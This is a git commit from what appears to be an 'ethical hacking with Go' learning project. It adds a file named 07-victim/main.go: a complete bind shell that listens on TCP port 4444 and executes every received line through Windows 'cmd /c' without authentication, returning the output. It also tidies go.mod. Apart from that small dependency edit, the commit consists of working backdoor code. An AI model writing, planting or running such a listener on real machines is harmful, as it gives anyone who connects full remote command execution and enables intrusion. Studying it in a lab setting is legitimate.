a10e3d3d432d74aa1adc3752f85bfa4ac6643601
MICHAELKITH <michaelkithinji27@gmail.com>
2025-07-26 22:50:31 +0300

    remote execution

---
+++ 07-victim/main.go
@@ -0,0 +1,37 @@
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "net"
+    "os/exec"
+)
+
+func main() {
+    listener, err := net.Listen("tcp", ":4444")
+    if err != nil {
+        fmt.Println("Error starting server:", err)
+        return
+    }
+    defer listener.Close()
+
+    for {
+        conn, err := listener.Accept()
+        if err != nil {
+            fmt.Println("Error accepting connection:", err)
+            continue
+        }
+        go handleConnection(conn)
+    }
+}
+
+func handleConnection(conn net.Conn) {
+    defer conn.Close()
+    reader := bufio.NewReader(conn)
+    for {
+        command, _ := reader.ReadString('\n')
+        cmd := exec.Command("cmd", "/c", command)
+        output, _ := cmd.CombinedOutput()
+        conn.Write(output)
+    }
+}
--- go.mod
+++ go.mod
@@ -2,7 +2,6 @@ module ethical-hacking-with-go
 
 go 1.24.5
 
-require (
-	github.com/google/gopacket v1.1.19 // indirect
-	golang.org/x/sys v0.0.0-20190412213103-97732733099d // indirect
-)
+require github.com/google/gopacket v1.1.19
+
+require golang.org/x/sys v0.0.0-20190412213103-97732733099d // indirect
